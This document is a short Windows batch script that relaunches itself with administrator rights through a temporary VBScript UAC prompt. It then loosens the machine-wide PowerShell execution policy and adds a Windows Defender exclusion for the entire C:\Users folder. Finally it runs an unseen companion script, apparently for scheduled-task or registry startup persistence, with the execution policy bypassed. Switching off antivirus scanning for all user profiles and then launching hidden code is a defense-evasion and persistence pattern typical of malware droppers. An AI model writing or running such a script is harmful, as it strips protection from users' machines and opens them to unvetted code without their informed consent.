@echo off
:: Check for Administrative privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 ( goto UACPrompt ) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: 0. Allow local PowerShell scripts to run
powershell.exe -NoProfile -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"

:: 1. Add Windows Defender Exclusion
powershell.exe -NoProfile -Command "Add-MpPreference -ExclusionPath 'C:\Users'"

:: 2. Set the path (Ensuring the filename matches your .ps1)
SET scriptPath=%~dp0schtask-start-reg.ps1

:: 3. Run the PowerShell script
powershell.exe -ExecutionPolicy Bypass -File "%scriptPath%"

pause
